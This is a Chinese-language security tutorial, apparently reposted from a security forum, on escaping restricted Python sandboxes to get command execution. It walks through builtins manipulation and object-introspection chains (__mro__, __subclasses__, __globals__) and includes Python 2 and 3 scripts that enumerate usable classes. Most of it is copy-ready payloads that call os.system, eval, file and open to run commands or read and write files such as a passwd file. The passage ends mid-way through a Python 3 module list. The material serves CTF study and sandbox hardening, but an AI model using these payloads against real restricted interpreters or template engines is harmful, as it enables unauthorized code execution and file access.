> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9473)

沙箱逃逸就是在在一个严格限制的 python 环境中，通过绕过限制和过滤达到执行更高权限，甚至 getshell 的过程 。

执行命令的模块
-------

```
os
timeit 
plarform
subprocess
pty
commands


```

os 模块  
os，语义为操作系统，模块提供了访问多个操作系统服务的功能，可以处理文件和目录。

```
os模块
import os
# 执行shell命令不会返回shell的输出
os.system('whoami')
# 会产生返回值，可通过read()的方式读取返回值
os.popen("whoami").read()
commands模块


```

timeit 模块

```
import timeit
timeit.timeit("__import__('os').system('dir')",number=1)


```

plarform 模块

```
import platform
print platform.popen('dir').read()


```

subprocess 模块

```
import subprocess
subprocess.call('dir',shell=True)
subprocess.Popen('dir', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
#stdin, stdout, stderr： 分别表示程序标准输入、输出、错误句柄。

python3
import subprocess
subprocess.run('dir',shell=True)


```

pty 模块

```
#仅限Linux环境
import pty
pty.spawn("ls")

```

commands 模块  
commands 模块会返回命令的输出和执行的状态位，仅限 Linux 环境

```
import commands
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("ls")

```

文件读取的模块
-------

```
file
open
codecs
fileinput


```

file() 函数  
该函数只存在于 Python2，Python3 不存在

```
file('/etc/passwd').read()
file('test.txt','w').write('xxx')


```

open() 函数

codecs 模块

```
import codecs
codecs.open('test.txt').read()


```

获取环境信息模块
--------

sys 模块

```
import sys
sys.version
sys.path
sys.modules

```

exec()，eval()，execfile()，compile() 函数

```
eval('__import__("os").system("ls")')
exec('__import__("os").system("ls")')
eval()函数只能计算单个表达式的值，而exec()函数可以动态运行代码段。
eval()函数可以有返回值，而exec()函数返回值永远为None。
compile('a = 1 + 2', '<string>', 'exec')


```

sys 模块  
该模块通过 modules() 函数引入命令执行模块来实现：

```
import sys
sys.modules['os'].system('calc')

```

```
# 下面代码可列出所有的内联函数
dir(__builtins__)
# Python3有一个builtins模块，可以导入builtins模块后通过dir函数查看所有的内联函数
import builtins
dir(builtins)


dir()函数
在没有参数的时候返回本地作用域中的名称列表   
在有参数的时候返回该对象的有效属性列表


```

python 沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。

```
__class__ 返回一个实例所属的类
__mro__ 查看类继承的所有父类，直到object
__subclasses__() 获取一个类的子类，返回的是一个列表
__bases__ 返回一个类直接所继承的类（元组形式）
__init__ 类实例创建之后调用, 对当前对象的实例的一些初始化
__globals__  使用方式是 函数名.__globals__，返回一个当前空间下能使用的模块，方法和变量的字典
__getattribute__ 当类被调用的时候，无条件进入此函数。
__getattr__ 对象中不存在的属性时调用
__dict__ 返回所有属性，包括属性，方法等


```

例子

```
class A(object):
    def __init__(self):
        self.name = "Bob"
        print('ok')
    def __getattribute__(self,item):
        print("getattribute")
    def __getattr__(self):
        print('getattr')
class B(A):
    pass
class C(A):
    pass
class D(B, C):
    pass
a=A()
print(a.__class__)#__main__.A
print(D.__mro__)
print(B.__subclasses__())
print(B.__base__)
print(A.__init__.__globals__)
print(a.name)
print(a.age)

result:
ok
getattribute
None
(<class '__main__.D'>, <class '__main__.B'>, <class '__main__.C'>, <class '__main__.A'>, <type 'object'>)
[<class '__main__.D'>]
<class '__main__.A'>
{'A': <class '__main__.A'>, 'a': <__main__.A object at 0x0000000002C00F28>, 'C': <class '__main__.C'>, 'B': <class '__main__.B'>, 'D': <class '__main__.D'>, '__builtins__': <module '__builtin__' (built-in)>, '__file__': 'G:\\ctf\\test.py', '__package__': None, '__name__': '__main__', '__doc__': None}
getattribute
None
getattribute
None


```

在 python 中, 我们知道, 不用引入直接使用的内置函数称为 builtin 函数, 随着`__builtin__`这一个 module 自动被引入到环境中  
(在 python3.x 版本中,`__builtin__`变成了 builtins, 而且需要引入)

因此, open(),int(),chr() 这些函数, 就相当于

```
__builtin__.open()
__builtin__.int()
__builtin__.chr()


```

如果我们把这些函数从 **builtin** 中删除, 那么就不能够再直接使用了

```
>>> import __builtin__
>>> del __builtin__.chr
>>> chr(1)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'chr' is not defined

```

同样, 刚才的`__import__`函数, 同样也是一个 builtin 函数, 同样, 常用的危险函数 eval,exec,execfile 也是`__builtin__`的, 因此只要从`__builtin__`中删除这些东西, 那么就不能再去使用了

`__builtin__`和 `__builtins__`之间是什么关系呢？

1、在主模块 main 中，`__builtins__`是对内建模块`__builtin__`本身的引用，即`__builtins__`完全等价于`__builtin__`，二者完全是一个东西，不分彼此。

2、非主模块 main 中，`__builtins__`仅是对`__builtin__.__dict__`的引用，而非`__builtin__`本身

**解决办法:**

`__builtins__`是一个默认引入的 module  
对于模块, 有一个函数 reload 用于重新从文件系统中的代码来载入模块

因此我们只需要

就可以重新得到完整的`__builtins__`模块了

但是, reload 也是`__builtins__`下面的函数, 如果直接把它干掉, 就没办法重新引入了

但可以使用

```
import imp
imp.reload(__builtins__)


```

> 对于支持继承的编程语言来说，其方法（属性）可能定义在当前类，也可能来自于基类，所以在方法调用时就需要对当前类和基类进行搜索以确定方法所在的位置。而搜索的顺序就是所谓的「方法解析顺序」（Method Resolution Order，或 MRO）。

关于 MRO 的文章：[http://hanjianwei.com/2013/07/25/python-mro/](http://hanjianwei.com/2013/07/25/python-mro/)

python 的主旨是一切变量皆对象  
python 的 object 类中集成了很多的基础函数，我们想要调用的时候也是需要用 object 去操作的，主要是通过`__mro__`和 `__bases__`两种方式来创建。  
`__mro__`属性获取类的 MRO(方法解析顺序)，也就是继承关系。  
`__bases__`属性可以获取上一层的继承关系，如果是多层继承则返回上一层的东西，可能有多个。

通过`__mro__` 和`__bases__`两种方式创建 object 类

```
().__class__.__bases__[0]
{}.__class__.__bases__[0]
[].__class__.__mro__[1]

python3
''.__class__.__mro__[1]
python2
''.__class__.__mro__[2]


```

然后通过 object 类的`__subclasses__()`方法来获得当前环境下能够访问的所有对象，因为调用对象的 `__subclasses__()` 方法会返回当前环境中所有继承于该对象的对象.。Python2 和 Python3 获取的结果不同。

```
{}.__class__.__bases__[0].__subclasses__()


```

常见逃逸思路  
当函数被禁用时，就要通过一些类中的关系来引用被禁用的函数。一些常见的寻找特殊模块的方式如下所示:

```
* __class__:获得当前对象的类
* __bases__ :列出其基类
* __mro__ :列出解析方法的调用顺序，类似于bases
* __subclasses__()：返回子类列表
* __dict__ ： 列出当前属性/函数的字典
* func_globals：返回一个包含函数全局变量的字典引用
* 从().__class__.__bases__[0].__subclasses__()出发，查看可用的类
* 若类中有file，考虑读写操作
* 若类中有<class 'warnings.WarningMessage'>，考虑从.__init__.func_globals.values()[13]获取eval，map等等；又或者从.__init__.func_globals[linecache]得到os
* 若类中有<type 'file'>，<class 'ctypes.CDLL'>，<class 'ctypes.LibraryLoader'>，考虑构造so文件


```

获取 object 类

```
''.__class__.__mro__[2]
[].__class__.__mro__[1]
{}.__class__.__mro__[1]
().__class__.__mro__[1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
[].__class__.__base__
().__class__.__base__
{}.__class__.__base__


#python2
''.__class__.__mro__[2]

#python3 
''.__class__.__mro__[1]

```

然后通过 object 类的`__subclasses__()`方法获取所有的子类列表

```
[].__class__.__mro__[1].__subclasses__()
{}.__class__.__mro__[1].__subclasses__()
().__class__.__mro__[1].__subclasses__()
{}.__class__.__bases__[0].__subclasses__()
().__class__.__bases__[0].__subclasses__()
[].__class__.__bases__[0].__subclasses__()

#python2
''.__class__.__mro__[2].__subclasses__()
#python3
''.__class__.__mro__[1].__subclasses__()


```

找到重载过的`__init__`类，例如：

```
[].__class__.__mro__[1].__subclasses__()[59].__init__


```

在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的，因为 wrapper 是指这些函数并没有被重载，这时它们并不是 function，不具有`__globals__`属性。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210421204714-b25ac26a-a29f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210421204714-b25ac26a-a29f-1.png)  
写个脚本帮我们来筛选出重载过的 **init** 类的类：

```
l=len([].__class__.__mro__[1].__subclasses__())
for i in range(l):
    if 'wrapper' not in str([].__class__.__mro__[1].__subclasses__()[i].__init__):
        print(i,[].__class__.__mro__[1].__subclasses__()[i])


```

result  
python2:

```
(59, <class 'warnings.WarningMessage'>)
(60, <class 'warnings.catch_warnings'>)
(61, <class '_weakrefset._IterationGuard'>)
(62, <class '_weakrefset.WeakSet'>)
(72, <class 'site._Printer'>)
(74, <class 'site.Quitter'>)
(75, <class 'codecs.IncrementalEncoder'>)
(76, <class 'codecs.IncrementalDecoder'>)

```

python3:

```
64 <class '_frozen_importlib._ModuleLock'>
65 <class '_frozen_importlib._DummyModuleLock'>
66 <class '_frozen_importlib._ModuleLockManager'>
67 <class '_frozen_importlib._installed_safely'>
68 <class '_frozen_importlib.ModuleSpec'>
79 <class '_frozen_importlib_external.FileLoader'>
80 <class '_frozen_importlib_external._NamespacePath'>
81 <class '_frozen_importlib_external._NamespaceLoader'>
83 <class '_frozen_importlib_external.FileFinder'>
92 <class 'codecs.IncrementalEncoder'>
93 <class 'codecs.IncrementalDecoder'>
94 <class 'codecs.StreamReaderWriter'>
95 <class 'codecs.StreamRecoder'>
96 <class '_weakrefset._IterationGuard'>
97 <class '_weakrefset.WeakSet'>
118 <class 'os._wrap_close'>
119 <class '_sitebuiltins.Quitter'>
120 <class '_sitebuiltins._Printer'>

```

重载过的 **init** 类的类具有 **globals** 属性，这里以 WarningMessage 为例，会返回很多 dict 类型：

```
#python2
[].__class__.__mro__[1].__subclasses__()[59].__init__.__globals__

#python3
[].__class__.__mro__[1].__subclasses__()[64].__init__.__globals__

```

寻找 keys 中的 **builtins** 来查看引用，这里同样会返回很多 dict 类型：

```
#python2
 [].__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']

```

再在 keys 中寻找可利用的函数即可，如 file() 函数为例：

```
#python2
[].__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd.txt').read()

```

至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。  
使用脚本遍历其他逃逸方法  
Python2 的脚本如下：

```
# coding=UTF-8

find_modules = {'filecmp': ['os', '__builtins__'], 'heapq': ['__builtins__'], 'code': ['sys', '__builtins__'],
                'hotshot': ['__builtins__'], 'distutils': ['sys', '__builtins__'], 'functools': ['__builtins__'],
                'random': ['__builtins__'], 'tty': ['sys', '__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'],
                'sysconfig': ['os', 'sys', '__builtins__'], 'whichdb': ['os', 'sys', '__builtins__'],
                'runpy': ['sys', '__builtins__'], 'pty': ['os', 'sys', '__builtins__'],
                'plat-atheos': ['os', 'sys', '__builtins__'], 'xml': ['__builtins__'], 'sgmllib': ['__builtins__'],
                'importlib': ['sys', '__builtins__'], 'UserList': ['__builtins__'], 'tempfile': ['__builtins__'],
                'mimify': ['sys', '__builtins__'], 'pprint': ['__builtins__'],
                'platform': ['os', 'platform', 'sys', '__builtins__'], 'collections': ['__builtins__'],
                'cProfile': ['__builtins__'], 'smtplib': ['__builtins__'], 'compiler': ['__builtins__', 'compile'],
                'string': ['__builtins__'], 'SocketServer': ['os', 'sys', '__builtins__'],
                'plat-darwin': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'sys', '__builtins__'],
                'repr': ['__builtins__'], 'wave': ['sys', '__builtins__', 'open'], 'curses': ['__builtins__'],
                'antigravity': ['__builtins__'], 'plat-irix6': ['os', 'sys', '__builtins__'],
                'plat-freebsd6': ['os', 'sys', '__builtins__'], 'plat-freebsd7': ['os', 'sys', '__builtins__'],
                'plat-freebsd4': ['os', 'sys', '__builtins__'], 'plat-freebsd5': ['os', 'sys', '__builtins__'],
                'plat-freebsd8': ['os', 'sys', '__builtins__'], 'aifc': ['__builtins__', 'open'],
                'sndhdr': ['__builtins__'], 'cookielib': ['__builtins__'], 'ConfigParser': ['__builtins__'],
                'httplib': ['os', '__builtins__'], '_MozillaCookieJar': ['sys', '__builtins__'],
                'bisect': ['__builtins__'], 'decimal': ['__builtins__'], 'cmd': ['__builtins__'],
                'binhex': ['os', 'sys', '__builtins__'], 'sunau': ['__builtins__', 'open'],
                'pydoc': ['os', 'sys', '__builtins__'], 'plat-riscos': ['os', 'sys', '__builtins__'],
                'token': ['__builtins__'], 'Bastion': ['__builtins__'], 'msilib': ['os', 'sys', '__builtins__'],
                'shlex': ['os', 'sys', '__builtins__'], 'quopri': ['__builtins__'],
                'multiprocessing': ['os', 'sys', '__builtins__'], 'dummy_threading': ['__builtins__'],
                'dircache': ['os', '__builtins__'], 'asyncore': ['os', 'sys', '__builtins__'],
                'pkgutil': ['os', 'sys', '__builtins__'], 'compileall': ['os', 'sys', '__builtins__'],
                'SimpleHTTPServer': ['os', 'sys', '__builtins__'], 'locale': ['sys', '__builtins__'],
                'chunk': ['__builtins__'], 'macpath': ['os', '__builtins__'], 'popen2': ['os', 'sys', '__builtins__'],
                'mimetypes': ['os', 'sys', '__builtins__'], 'toaiff': ['os', '__builtins__'],
                'atexit': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'],
                'tabnanny': ['os', 'sys', '__builtins__'], 'HTMLParser': ['__builtins__'],
                'encodings': ['codecs', '__builtins__'], 'BaseHTTPServer': ['sys', '__builtins__'],
                'calendar': ['sys', '__builtins__'], 'mailcap': ['os', '__builtins__'],
                'plat-unixware7': ['os', 'sys', '__builtins__'], 'abc': ['__builtins__'], 'plistlib': ['__builtins__'],
                'bdb': ['os', 'sys', '__builtins__'], 'py_compile': ['os', 'sys', '__builtins__', 'compile'],
                'pipes': ['os', '__builtins__'], 'rfc822': ['__builtins__'],
                'tarfile': ['os', 'sys', '__builtins__', 'open'], 'struct': ['__builtins__'],
                'urllib': ['os', 'sys', '__builtins__'], 'fpformat': ['__builtins__'],
                're': ['sys', '__builtins__', 'compile'], 'mutex': ['__builtins__'],
                'ntpath': ['os', 'sys', '__builtins__'], 'UserString': ['sys', '__builtins__'], 'new': ['__builtins__'],
                'formatter': ['sys', '__builtins__'], 'email': ['sys', '__builtins__'],
                'cgi': ['os', 'sys', '__builtins__'], 'ftplib': ['os', 'sys', '__builtins__'],
                'plat-linux2': ['os', 'sys', '__builtins__'], 'ast': ['__builtins__'],
                'optparse': ['os', 'sys', '__builtins__'], 'UserDict': ['__builtins__'],
                'inspect': ['os', 'sys', '__builtins__'], 'mailbox': ['os', 'sys', '__builtins__'],
                'Queue': ['__builtins__'], 'fnmatch': ['__builtins__'], 'ctypes': ['__builtins__'],
                'codecs': ['sys', '__builtins__', 'open'], 'getopt': ['os', '__builtins__'], 'md5': ['__builtins__'],
                'cgitb': ['os', 'sys', '__builtins__'], 'commands': ['__builtins__'],
                'logging': ['os', 'codecs', 'sys', '__builtins__'], 'socket': ['os', 'sys', '__builtins__'],
                'plat-irix5': ['os', 'sys', '__builtins__'], 'sre': ['__builtins__', 'compile'],
                'ensurepip': ['os', 'sys', '__builtins__'], 'DocXMLRPCServer': ['sys', '__builtins__'],
                'traceback': ['sys', '__builtins__'], 'netrc': ['os', '__builtins__'], 'wsgiref': ['__builtins__'],
                'plat-generic': ['os', 'sys', '__builtins__'], 'weakref': ['__builtins__'],
                'ihooks': ['os', 'sys', '__builtins__'], 'telnetlib': ['sys', '__builtins__'],
                'doctest': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'],
                'smtpd': ['os', 'sys', '__builtins__'], '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'],
                'dis': ['sys', '__builtins__'], 'os': ['sys', '__builtins__', 'open'],
                'pdb': ['os', 'sys', '__builtins__'], 'this': ['__builtins__'], 'base64': ['__builtins__'],
                'os2emxpath': ['os', '__builtins__'], 'glob': ['os', 'sys', '__builtins__'],
                'unittest': ['__builtins__'], 'dummy_thread': ['__builtins__'],
                'fileinput': ['os', 'sys', '__builtins__'], '__future__': ['__builtins__'],
                'robotparser': ['__builtins__'], 'plat-mac': ['os', 'sys', '__builtins__'],
                '_threading_local': ['__builtins__'], '_LWPCookieJar': ['sys', '__builtins__'],
                'wsgiref.egg-info': ['os', 'sys', '__builtins__'], 'sha': ['__builtins__'],
                'sre_constants': ['__builtins__'], 'json': ['__builtins__'], 'Cookie': ['__builtins__'],
                'tokenize': ['__builtins__'], 'plat-beos5': ['os', 'sys', '__builtins__'],
                'rexec': ['os', 'sys', '__builtins__'], 'lib-tk': ['__builtins__'], 'textwrap': ['__builtins__'],
                'fractions': ['__builtins__'], 'sqlite3': ['__builtins__'], 'posixfile': ['__builtins__', 'open'],
                'imaplib': ['subprocess', 'sys', '__builtins__'], 'xdrlib': ['__builtins__'],
                'imghdr': ['__builtins__'], 'macurl2path': ['os', '__builtins__'],
                '_osx_support': ['os', 'sys', '__builtins__'],
                'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'],
                'plat-netbsd1': ['os', 'sys', '__builtins__'], 'nturl2path': ['__builtins__'],
                'tkinter': ['__builtins__'], 'copy': ['__builtins__'], 'pickletools': ['__builtins__'],
                'hashlib': ['__builtins__'], 'anydbm': ['__builtins__', 'open'], 'keyword': ['__builtins__'],
                'timeit': ['timeit', 'sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'],
                'StringIO': ['__builtins__'], 'modulefinder': ['os', 'sys', '__builtins__'],
                'stringprep': ['__builtins__'], 'markupbase': ['__builtins__'], 'colorsys': ['__builtins__'],
                'shelve': ['__builtins__', 'open'], 'multifile': ['__builtins__'], 'sre_parse': ['sys', '__builtins__'],
                'pickle': ['sys', '__builtins__'], 'plat-os2emx': ['os', 'sys', '__builtins__'],
                'mimetools': ['os', 'sys', '__builtins__'], 'audiodev': ['__builtins__'], 'copy_reg': ['__builtins__'],
                'sre_compile': ['sys', '__builtins__', 'compile'], 'CGIHTTPServer': ['os', 'sys', '__builtins__'],
                'idlelib': ['__builtins__'], 'site': ['os', 'sys', '__builtins__'],
                'getpass': ['os', 'sys', '__builtins__'], 'imputil': ['sys', '__builtins__'],
                'bsddb': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'],
                'numbers': ['__builtins__'], 'io': ['__builtins__', 'open'],
                'plat-sunos5': ['os', 'sys', '__builtins__'], 'symtable': ['__builtins__'],
                'pyclbr': ['sys', '__builtins__'], 'shutil': ['os', 'sys', '__builtins__'], 'lib2to3': ['__builtins__'],
                'threading': ['__builtins__'], 'dbhash': ['sys', '__builtins__', 'open'],
                'gettext': ['os', 'sys', '__builtins__'], 'dumbdbm': ['__builtins__', 'open'],
                '_weakrefset': ['__builtins__'], '_abcoll': ['sys', '__builtins__'], 'MimeWriter': ['__builtins__'],
                'test': ['__builtins__'], 'opcode': ['__builtins__'], 'csv': ['__builtins__'],
                'nntplib': ['__builtins__'], 'profile': ['os', 'sys', '__builtins__'],
                'genericpath': ['os', '__builtins__'], 'stat': ['__builtins__'], '__phello__.foo': ['__builtins__'],
                'sched': ['__builtins__'], 'statvfs': ['__builtins__'], 'trace': ['os', 'sys', '__builtins__'],
                'warnings': ['sys', '__builtins__'], 'symbol': ['__builtins__'], 'sets': ['__builtins__'],
                'htmlentitydefs': ['__builtins__'], 'urllib2': ['os', 'sys', '__builtins__'],
                'SimpleXMLRPCServer': ['os', 'sys', '__builtins__'], 'sunaudio': ['__builtins__'],
                'pdb.doc': ['os', '__builtins__'], 'asynchat': ['__builtins__'], 'user': ['os', '__builtins__'],
                'xmllib': ['__builtins__'], 'codeop': ['__builtins__'], 'plat-next3': ['os', 'sys', '__builtins__'],
                'types': ['__builtins__'], 'argparse': ['__builtins__'], 'uuid': ['os', 'sys', '__builtins__'],
                'plat-aix4': ['os', 'sys', '__builtins__'], 'plat-aix3': ['os', 'sys', '__builtins__'],
                'ssl': ['os', 'sys', '__builtins__'], 'poplib': ['__builtins__'], 'xmlrpclib': ['__builtins__'],
                'difflib': ['__builtins__'], 'urlparse': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'],
                '_strptime': ['__builtins__'], 'htmllib': ['__builtins__'], 'site-packages': ['__builtins__'],
                'posixpath': ['os', 'sys', '__builtins__'], 'stringold': ['__builtins__'],
                'gzip': ['os', 'sys', '__builtins__', 'open'], 'mhlib': ['os', 'sys', '__builtins__'],
                'rlcompleter': ['__builtins__'], 'hmac': ['__builtins__']}
target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']
target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']
all_targets = list(set(find_modules.keys() + target_modules + target_functions))
all_modules = list(set(find_modules.keys() + target_modules))
subclasses = ().__class__.__bases__[0].__subclasses__()
sub_name = [s.__name__ for s in subclasses]
# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()
print('----------1-----------')
for i, s in enumerate(sub_name):
    for f in all_targets:
        if f == s:
            if f in target_functions:
                print(i, f)
            elif f in all_modules:
                target = find_modules[f]
                sub_dict = subclasses[i].__dict__
                for t in target:
                    if t in sub_dict:
                        print(i, f, target)
print('----------2-----------')
# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.func_globals
        for m in all_targets:
            if m in more:
                print(i, sub, m, find_modules.get(m))
    except Exception as e:
        pass
print('----------3-----------')
# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("ls")')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.func_globals.values()
        for j, v in enumerate(more):
            for f in all_targets:
                try:
                    if f in v:
                        if f in target_functions:
                            print(i, j, sub, f)
                        elif f in all_modules:
                            target = find_modules.get(f)
                            sub_dict = v[f].__dict__
                            for t in target:
                                if t in sub_dict:
                                    print(i, j, sub, f, target)
                except Exception as e:
                    pass
    except Exception as e:
        pass
print('----------4-----------')
# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")
# <class 'warnings.catch_warnings'>类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似
for i, sub in enumerate(subclasses):
    try:
        more = sub()._module.__builtins__
        for f in all_targets:
            if f in more:
                print(i, f)
    except Exception as e:
        pass


```

下面简单归纳下遍历的 4 种方式：

**第一种方式**

序号为 40，即 file() 函数，进行文件读取和写入，payload 如下：

```
''.__class__.__mro__[2].__subclasses__()[40]('E:/passwd').read()
''.__class__.__mro__[2].__subclasses__()[40]('E:/test.txt', 'w').write('xxx')


```

这和前面元素链构造时给出的 Demo 有点区别：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()


```

序号 59 是 WarningMessage 类，其具有 globals 属性，包含 builtins，其中含有 file() 函数，属于第二种方式；而这里是直接在 object 类的所有子类中直接找到了 file() 函数的序号为 40，直接调用即可。  
**第二种方式**

先看序号为 59 的 WarningMessage 类有哪些而利用的模块或方法：

```
(59, <class 'warnings.WarningMessage'>, 'linecache', ['os', 'sys', '__builtins__'])
(59, <class 'warnings.WarningMessage'>, '__builtins__', None)
(59, <class 'warnings.WarningMessage'>, 'sys', None)
(59, <class 'warnings.WarningMessage'>, 'types', ['__builtins__'])


```

以 linecache 中的 os 为例，这里简单解释下工具的寻找过程依次如下：

```
# 确认linecache
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache']
# 返回linecache字典中的所有键
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__
.keys()
# 在linecache字典的所有键中寻找os的序号，找到为12
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__
.keys().index('os')
# 更换keys()为values()，访问12序号的元素，并获取该os字典的所有键
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys()
# 在os字典的所有键中寻找system的序号，找到为79
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')
# 执行os.system()
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[79]('calc')


```

payload 如下：

```
# linecache利用
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('calc')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['sys'].modules['os'].system('calc')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['__builtins__']['__import__']('os').system('calc')

# __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('E:/test.txt', 'w').write('hello')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['execfile']('E:/exp.py')
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").system("calc")')
exec(''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['compile']('__import__("os").system("calc")', '<string>', 'exec'))

# sys利用
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('calc')

# types利用，后面还是通过__builtins__实现利用
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['types'].__dict__['__builtins__']['__import__']('os').system('calc')


```

序号为 60 的 catch_warnings 类利用 payload 同上。

序号为 61、62 的两个类均只有`__builtins__`可利用，利用 payload 同上。

序号为 72、77 的两个类_Printer 和 Quitter，相比前面的，没见过的有 os 和 traceback，但只有 os 模块可利用：

```
# os利用
''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('calc')


```

序号为 78、79 的两个类 IncrementalEncoder 和 IncrementalDecoder，相比前面的，没见过的有 open：

```
# open利用
''.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__['open']('E:/passwd').read()
''.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__['open']('E:/test.txt', 'w').write()

```

**第三种方式**

先看下序号为 59 的 WarningMessage 类：

```
(59, 13, <class 'warnings.WarningMessage'>, '__import__')
(59, 13, <class 'warnings.WarningMessage'>, 'file')
(59, 13, <class 'warnings.WarningMessage'>, 'compile')
(59, 13, <class 'warnings.WarningMessage'>, 'eval')
(59, 13, <class 'warnings.WarningMessage'>, 'open')
(59, 13, <class 'warnings.WarningMessage'>, 'execfile')


```

注意是通过 values() 函数中的数组序号来填写第二个数值实现调用，以下以 eval 为示例，其他的利用 payload 和前面的差不多就不再赘述了：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("calc")')

```

其他类似修改即可。

**第四种方式**

这里只有一种序号，为 60：

```
(60, '__import__')
(60, 'file')
(60, 'repr')
(60, 'compile')
(60, 'eval')
(60, 'open')
(60, 'execfile')


```

调用示例如下，其他类似修改即可：

```
''.__class__.__mro__[2].__subclasses__()[60]()._module.__builtins__['__import__']("os").system("calc")


```

python3

```
# coding=UTF-8
# Python3
find_modules = {'asyncio': ['subprocess', 'sys', '__builtins__'], 'collections': ['__builtins__'],
                'concurrent': ['__builtins__'], 'ctypes': ['__builtins__'], 'curses': ['__builtins__'],
                'dbm': ['os', 'sys', '__builtins__', 'open'], 'distutils': ['sys', '__builtins__'],
                'email': ['__builtins__'], 'encodings': ['codecs', 'sys', '__builtins__'],
                'ensurepip': ['os', 'sys', '__builtins__'], 'html': ['__builtins__'], 'http': ['__builtins__'],
                'idlelib': ['__builtins__'], 'importlib': ['sys', '__import__', '__builtins__'],
                'json': ['codecs', '__builtins__'], 'lib2to3': ['__builtins__'],
                'logging': ['os', 'sys', '__builtins__'], 'msilib': ['os', 'sys', '__builtins__'],
                'multiprocessing': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'], 'sqlite3': ['__builtins__'],
                'test': ['__builtins__'], 'tkinter': ['sys', '__builtins__'], 'turtledemo': ['__builtins__'],
                'unittest': ['__builtins__'], 'urllib': ['__builtins__'],
                'venv': ['os', 'subprocess', 'sys', '__builtins__'], 'wsgiref': ['__builtins__'],
                'xml': ['__builtins__'], 'xmlrpc': ['__builtins__'], '__future__': ['__builtins__'],
                '__phello__.foo': ['__builtins__'], '_bootlocale': ['sys', '__builtins__'],
                '_collections_abc': ['sys', '__builtins__'], '_compat_pickle': ['__builtins__'],
                '_compression': ['__builtins__'], '_dummy_thread': ['__builtins__'], '_markupbase': ['__builtins__'],
                '_osx_support': ['os', 'sys', '__builtins__'], '_pydecimal': ['__builtins__'],
                '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'], '_sitebuiltins': ['sys', '__builtins__'],
                '_strptime': ['__builtins__'], '_threading_local': ['__builtins__'], '_weakrefset': ['__builtins__'],
                'abc': ['__builtins__'], 'aifc': ['__builtins__', 'open'], 'antigravity': ['__builtins__'],
                'argparse': ['__builtins__'], 'ast': ['__builtins__'], 'asynchat': ['__builtins__'],
                'asyncore': ['os', 'sys', '__builtins__'], 'base64': ['__builtins__'],
                'bdb': ['os', 'sys', '__builtins__'], 'binhex': ['os', '__builtins__'], 'bisect': ['__builtins__'],
                'bz2': ['os', '__builtins__', 'open'], 'cProfile': ['__builtins__'],
